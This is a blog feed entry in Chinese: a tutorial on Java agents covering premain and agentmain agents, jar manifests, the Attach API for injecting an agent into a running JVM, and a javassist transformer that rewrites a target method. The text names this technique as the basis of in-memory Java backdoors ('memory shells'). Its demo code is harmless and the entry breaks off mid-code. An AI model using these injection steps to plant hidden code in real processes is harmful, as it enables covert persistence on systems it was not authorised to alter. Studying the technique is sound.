<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clown的站点</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2024-10-31T15:13:39.427Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java Agent学习</title>
    <link href="https://clowsman.github.io/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-30T12:41:16.000Z</published>
    <updated>2024-10-31T15:13:39.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java-agent介绍"><a href="#Java-Agent介绍" class="headerlink" title="Java Agent介绍"></a>Java Agent介绍</h1><p>官方文档：<a href="https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html">https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html</a></p><p>java agent就是一种能够在不影响正常编译的情况下，修改java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。也就是平时所说的插桩技术，平常的热部署、诊断工具都是基于Java Agent技术来实现的。该技术从JDK1.5开始引入。</p><h1 id="java-agent使用"><a href="#Java-Agent使用" class="headerlink" title="Java Agent使用"></a>Java Agent使用</h1><p>Java Agent分为两种，一种是在JVM启动前加载的premain-Agent，另一种是JVM启动后加载的agentmain-Agent，有点类似特殊的拦截器的样子。</p><h2 id="premain-agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h2><p>实现该Agent首先我们必须实现一个静态premain方法，同时我们jar文件的清单(mainfest)中必须要有Premain-Class属性，也就是jar包中常见到的MF文件，这从官方文档中可以得知</p><p><img src="https://cdn.clown2024.cn/image-20241030211341318.png" alt="image-20241030211341318"></p><p>可以知道，就是在执行main方法前执行我们的premain方法，执行的类就是我们Premain-Class属性的值</p><p>现在来实现一个简单的premain-Agent，先正常maven创建一个普通的项目</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">premainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            System.out.printf(<span class="hljs-string">&quot;调用了JavaAgent%d次\n&quot;</span>,i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着在 <code>resources/META-INF/</code> 下创建 <code>MANIFEST.MF</code> 清单文件用以指定 <code>premain-Agent</code> 的启动类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Premain-Class: org.example.Agent.premainAgent<br><br></code></pre></td></tr></table></figure><blockquote><p>要注意该文件最后一定要多一个换行，不然会爆红</p></blockquote><p>目前的目录结构如下：</p><p><img src="https://cdn.clown2024.cn/image-20241030213350306.png" alt="image-20241030213350306"></p><p>然后我们将该文件打成jar包，这里记录两种打包方式</p><p><strong>用jar命令打包</strong></p><p>打包前我们需要将java文件替换成我们编译好的class文件，因为jar命令就只是将文件打包成一个jar，并不会进行编译，而jar包的文件想要被JVM识别就需要是class文件</p><p>然后对src目录的所有文件打包</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">CTF</span>\<span class="hljs-title">Java</span>\<span class="hljs-title">JavaCode</span>\<span class="hljs-title">JavaAgent</span>\<span class="hljs-title">src</span>\<span class="hljs-title">main</span>&gt;<span class="hljs-title">jar</span> <span class="hljs-title">cvfm</span> ..\..\<span class="hljs-title">agent.jar</span> <span class="hljs-title">resources</span>/<span class="hljs-title">META</span>-<span class="hljs-title">INF</span>/<span class="hljs-title">MANIFEST.MF</span> ..\..\<span class="hljs-title">src</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220310229.png" alt="image-20241030220310229"></p><p><img src="https://cdn.clown2024.cn/image-20241030220348113.png" alt="image-20241030220348113"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">参数说明：<br>c：创建新的 JAR 文件。<br>v：生成详细输出，以便查看正在执行的操作。<br>f：指定 JAR 文件的名称。<br>m：指定 MANIFEST.MF 文件的位置。<br></code></pre></td></tr></table></figure><p>然后就能看到我们的agent.jar包了，我看文章也可以直接指定单一class文件打成jar包，例如这样</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">jar cvfm ..\..\agent1.jar resources/META-INF/MANIFEST.MF java\org\example\Agent\<br>premainAgent.class<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220652347.png" alt="image-20241030220652347"></p><p>这种打包方式会自动给你创建必要的包路径，对比了一下两种打包方式，目录结构如下</p><p><img src="https://cdn.clown2024.cn/image-20241030220817921.png" alt="image-20241030220817921"></p><p>指定class文件打包的就是直接从java包开始创建，只创建寻找类的必要的包</p><p><img src="https://cdn.clown2024.cn/image-20241030220900229.png" alt="image-20241030220900229"></p><p>而指定目录的方式就会从我们指定的目录开始打包，都会包括进去</p><p>顺便也记录一下有关jar会用的上的其他命令：</p><ul><li><p>检查jar文件内容：jar tvf agent.jar</p><p><img src="https://cdn.clown2024.cn/image-20241030221232096.png" alt="image-20241030221232096"></p></li></ul><p><strong>使用idea打包</strong></p><p>这种方式不需要提前编译，他在build的时候就会帮我们编译</p><p>我们选择选择<code>Project Structure</code> -&gt; <code>Artifacts</code> -&gt; <code>JAR</code> -&gt; <code>From modules with dependencies</code></p><p><img src="https://cdn.clown2024.cn/image-20241030221418303.png" alt="image-20241030221418303"></p><p><img src="https://cdn.clown2024.cn/image-20241030221442499.png" alt="image-20241030221442499"></p><p><img src="https://cdn.clown2024.cn/image-20241030221521466.png" alt="image-20241030221521466"></p><p>然后选择选择<code>Build</code> -&gt; <code>Build Artifacts</code> -&gt; <code>Build</code></p><p>然后就可以在out目录看到我们生成的jar包了</p><p><img src="https://cdn.clown2024.cn/image-20241030221714027.png" alt="image-20241030221714027"></p><p>现在我们的agent类已经创建好了，我们需要再创建一个新的目标类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样使用MF来打包，创建一个MF文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Main-Class: org.example.Main<br><br></code></pre></td></tr></table></figure><p>然后打成jar包</p><p>现在我们就得到两个jar包</p><p><img src="https://cdn.clown2024.cn/image-20241030222419726.png" alt="image-20241030222419726"></p><p>然后我们只要添加一个参数就能应用agent.jar包，格式在官方文档也有，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-javaagent:&lt;jarpath&gt;[=&lt;options&gt;]<br># options是传递给代理的参数，premain的agentArgs字段就是用来接受参数的<br></code></pre></td></tr></table></figure><p>现在执行下面命令运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -javaagent:agent.jar -jar TestAgent.jar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030223732827.png" alt="image-20241030223732827"></p><h2 id="agentmain-agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h2><p>agentmain-Agent就是能够在JVM启动后加载并修改字节码</p><p>编写该类需要实现agentmain方法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样写一个MF文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br><br></code></pre></td></tr></table></figure><p>然后写一个一直运行的目标类方便观察结果</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是agentmain就不是通过命令行指定参数的形式启动了，官方为了实现启动后加载，提供了<code>Attach API</code>。Attach API 很简单，只有 2 个主要的类，都在 <code>com.sun.tools.attach</code>包里面。</p><p>这两个类为<code>com.sun.tools.attach.VirtualMachine</code>类和<code>com.sun.tools.attach.VirtualMachineDescriptor</code>类</p><blockquote><p>这两个类在tools.jar包中，可能要手动添加一下jar包，因为我在jdk8u65测试的时候他没有自动引入</p><p><img src="https://cdn.clown2024.cn/image-20241030232514951.png" alt="image-20241030232514951"></p></blockquote><h3 id="virtualmachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h3><p>该类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>我们可以通过给该类的attach方法传入一个JVM的PID，然后远程连接到该JVM上，之后就可以对该JVM及进行操作，比如注入agent就是以这种形式</p><p>下面是该类的主要方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//允许我们传入一个JVM的PID，然后远程连接到该JVM上<br>VirtualMachine.attach()<br> <br>//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理<br>VirtualMachine.loadAgent()<br> <br>//获得当前所有的JVM列表<br>VirtualMachine.list()<br> <br>//解除与特定JVM的连接<br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure><p>使用其中一个方法试试</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030234554068.png" alt="image-20241030234554068"></p><h3 id="virtualmachinedescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h3><p>该类就是一个描述特定虚拟机的类，从前面list方法获取的返回值也能知道，他就代表一个虚拟机，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。</p><p>我们可以测试一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>            System.out.println(virtualMachineDescriptor.displayName());<br>            System.out.println(virtualMachineDescriptor.id());<span class="hljs-comment">//打印PID</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030235436825.png" alt="image-20241030235436825"></p><h3 id="注入agent"><a href="#注入agent" class="headerlink" title="注入agent"></a>注入agent</h3><p>现在知道了这两个类我们就可以进行注入了</p><p>同样的我们前面的agent要打成jar包，然后我们还要写一个inject类用于注入</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后先将目标类运行起来，一段时间后开启我们的inject类</p><p><img src="https://cdn.clown2024.cn/image-20241031000148056.png" alt="image-20241031000148056"></p><p>可以看到成功注入目标类中</p><h1 id="instrumentation实例"><a href="#Instrumentation实例" class="headerlink" title="Instrumentation实例"></a>Instrumentation实例</h1><h2 id="instrumentation介绍"><a href="#Instrumentation介绍" class="headerlink" title="Instrumentation介绍"></a>Instrumentation介绍</h2><p>在实现agent的方法的时候，我们发现除了参数的接受，他还有另一个Instrumentation类型的参数，该类在java.lang.instrument包下，那么什么是Instrumentation呢</p><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p>Instrumentation是一个接口，其常用方法如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//删除一个类转换器</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类，相当于重新加载使我们的修改生效</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br> <br>    <span class="hljs-comment">//判断一个类是否能被修改</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// 获取目标所有已经加载的类。</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//获取一个对象的大小</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br> <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="instrumentation使用"><a href="#Instrumentation使用" class="headerlink" title="Instrumentation使用"></a>Instrumentation使用</h2><p>我们修改一下前面的agentMain来试一试Instrumentation的功能，我们给目标类添加一个ClassFileTransformer类转换器</p><p>ClassFileTransformer接口下只有一个transform方法，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 java agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与 addTransformer 搭配使用。</p><p>目标类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            Hello();<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是改一下我们的agentMain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//获取所有已加载的类</span><br>        <span class="hljs-comment">//获取目标JVM加载的全部类</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>))&#123;<br><br>                <span class="hljs-comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是我们的ClassFileTransformer，这里用javassist来修改类</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.example.Main&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;Hello&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的MF文件需要修改成如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br><br></code></pre></td></tr></table></figure><p>然后直接用maven打jar包</p><p><img src="https://cdn.clown2024.cn/image-20241031113452048.png" alt="image-20241031113452048"></p><blockquote><p>maven打成jar包有一个坑点，他会默认替换你的MF文件变成这样</p><p><img src="https://cdn.clown2024.cn/image-20241031114835052.png" alt="image-20241031114835052"></p><p>我们可以手动替换一下jar包里面的MF文件，或者我们可以配置一下maven的打包插件让他自动生成MF文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br><span class="hljs-comment">&lt;!--                            &lt;Premain-Class&gt;org.example.Agent.premainAgent&lt;/Premain-Class&gt;--&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Agent-Class</span>&gt;</span>org.example.Agent.agentmainAgent<span class="hljs-tag">&lt;/<span class="hljs-name">Agent-Class</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在再打包就有需要的属性了</p><p><img src="https://cdn.clown2024.cn/image-20241031115458888.png" alt="image-20241031115458888"></p></blockquote><p>最后编写Agent的注入类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> 